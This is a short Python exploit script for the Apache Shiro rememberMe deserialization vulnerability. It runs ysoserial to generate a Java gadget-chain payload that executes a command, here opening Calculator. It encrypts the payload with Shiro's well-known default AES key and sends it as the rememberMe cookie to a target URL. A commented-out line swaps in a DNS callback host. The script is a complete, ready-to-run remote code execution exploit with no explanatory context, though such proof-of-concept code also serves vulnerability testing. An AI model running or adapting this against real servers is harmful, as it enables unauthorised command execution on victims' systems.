#!/usr/bin/env python3
# coding=utf-8

import uuid
import base64
import subprocess

import requests
from Crypto.Cipher import AES


# EXP_CLASS = ["URLDNS"]
# EXP_CLASS = ["CommonsBeanutils1"]
EXP_CLASS = ["CommonsCollections1"]
BLOCK_SIZE = AES.block_size
PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
SHIRO_KEY = "kPH+bIxk5D2deZiIxcaaaA=="
AES_MODE = AES.MODE_CBC
AES_IV = uuid.uuid4().bytes

def attack(target):
    for _exp_class in EXP_CLASS:
        print("[*] Try to use {} payload...".format(_exp_class))
        popen = subprocess.Popen(
            ["java", "-jar", "ysoserial.jar", _exp_class, "open -a Calculator"],
            # ["java", "-jar", "ysoserial.jar", _exp_class, "http://wilsonnb.your-dns-server.com"],
            stdout=subprocess.PIPE
        )
        encryptor = AES.new(base64.b64decode(SHIRO_KEY), AES_MODE, AES_IV)
        file_body = PAD_FUNC(popen.stdout.read())
        base64_ciphertext = base64.b64encode(AES_IV + encryptor.encrypt(file_body))
        print("[*] base64_ciphertext: {}".format(base64_ciphertext))
        try:
            response = requests.get(
                target, timeout=9, cookies={"rememberMe": base64_ciphertext.decode()}
            )
        except Exception as e:
            print("[x] Request to target URL fail! {}".format(e))
            break

if __name__ == '__main__':
    attack(target="http://127.0.0.1:8080/")
